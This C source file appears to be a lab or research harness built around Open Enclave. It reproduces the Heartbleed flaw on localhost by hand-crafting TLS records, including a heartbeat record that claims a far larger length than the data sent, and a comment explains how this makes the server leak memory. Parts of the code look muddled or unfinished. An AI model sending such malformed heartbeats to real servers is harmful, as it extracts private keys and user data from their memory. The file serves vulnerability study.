/* 
 * Protected server 
 */
#include <openenclave/host.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <linux/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/mman.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <stdbool.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <poll.h>

#include "include/openssl/ssl.h" 
#include "include/openssl/err.h" 
#include "include/openssl/rsa.h" 
#include "include/openssl/x509.h" 
#include "include/openssl/evp.h" 

#include "bus_functions.h"
#include "Heartbleed_u.h"

int client_not_connected;

const char *DEFAULT_PORT_SERVER = "4433";
char* DEFAULT_IP_STRING = "localhost";

#define BUF_SIZE    (400)
#define HEADER_SIZE (5)

char *msg1 = "DATA-DATA-DATA-DATA";
char *msg2 = "SECRET-SECRET-SECRET-SECRET";

int recv_data(int sock_desc, uint16_t length, uint8_t *buffer)
{
    uint8_t *ptr = buffer;
    int k = 0;

    while (length > 0)
    {
        k = recv(sock_desc, ptr, length, 0);

        if (k == -1)
        {
            printf("Error while receiving data\n");
            return -1;
        }
        ptr += k;
        length -= k;
    }
    return 0;
}

int send_data(int sock_desc, uint8_t *buffer, uint16_t length)
{
    int k = 0;
    uint8_t *ptr = buffer;
    while (length > 0)
    {
        k = send(sock_desc, ptr, length, 0);
        if (k == -1)
        {
            return -1; 
        }
        ptr += k;
        length -= k;
    }
    return 0;
}

int main(int argc, const char* argv[])
{
    oe_result_t result;
    int ret = 1,socket_fd;
    oe_enclave_t* enclave = NULL;
    uint8_t *buf = malloc(BUF_SIZE), *buf2 = malloc(BUF_SIZE);
    uint8_t header[HEADER_SIZE] = {0,},data[10];

    client_not_connected = 0;

    uint32_t flags = OE_ENCLAVE_FLAG_DEBUG;
/*
    if (argc != 2)
    {
        fprintf(
            stderr, "Usage: %s enclave_image_path [ --simulate  ]\n", argv[0]);
        goto exit;
    }

    // Create the enclave
    result = oe_create_Heartbleed_enclave(
        "Heartbleedenc.signed", OE_ENCLAVE_TYPE_AUTO, flags, NULL, 0, &enclave);

    if (result != OE_OK)
    {
        fprintf(
            stderr,
            "oe_create_Heartbleed_enclave(): result=%u (%s)\n",
            result,
            oe_result_str(result));
        goto exit;
    }
*/
    fprintf(stdout,"Accepting connections on port 4433 (localhost)\n");

    ret = prepare_server(atoi(DEFAULT_PORT_SERVER), &socket_fd);

    fprintf(stdout,"Receiving HELLO\n");

    if (0 != recv_data(socket_fd, 225, buf))
    {
        printf("Error while receiving data\n");
        abort();
    }

    fprintf(stdout,"Sending header...\n",buf);

    header[0] = 22;
    header[1] = 3;
    header[2] = 2;
    header[3] = 0;
    header[4] = 4;

    if (0 != send_data(socket_fd, header, sizeof(header)))
    {
        printf("Error while sending header\n");
        abort();
    }

    /* Sending data... */
    data[0] = 0x0E;

    if (0 != send_data(socket_fd, data, sizeof(data)))
    {
        printf("Error while sending data\n");
        abort();
    }

    /* 
      Heartbleed
      The flaw is triggered when we tell the server that we are 
      sending a message that is X bytes long, but we send a shorter 
      message; OpenSSL won't check if we really sent the X bytes of data.
      The server will store our message, then read the X bytes of data 
      from its memory (it reads the memory region where our message is 
      supposedly stored) and send that read message back.
    */

    printf("Receiving HB...\n");

    SSL *ssl = malloc(sizeof(SSL));
    SSL_CTX *ctx = malloc(sizeof(SSL_CTX));
    ctx = init_ctx_client();
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl,socket_fd);

    SSL_read(ssl,buf2,sizeof(buf2));

    header[0] = 24;
    header[1] = 3;
    header[2] = 2;
    header[3] = 64;
    header[4] = 0;

    send_data(socket_fd, header, sizeof(header));

    if (0 != send_data(socket_fd, data, sizeof(data)))
    {
        printf("Error while sending data\n");
        abort();
    }


exit:
    return ret;
}
